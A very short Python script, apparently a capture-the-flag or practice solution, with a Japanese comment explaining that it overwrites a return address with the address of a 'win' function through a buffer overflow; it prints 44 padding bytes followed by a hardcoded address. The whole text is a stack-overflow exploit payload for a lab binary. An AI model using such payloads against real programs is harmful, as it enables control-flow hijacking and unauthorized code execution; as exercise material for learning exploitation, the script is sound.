# bofでリターンアドレスをwinのアドレスに書き換える

payload = "A" * 44
payload += "\xcb\x85\x04\x08"
print(payload)
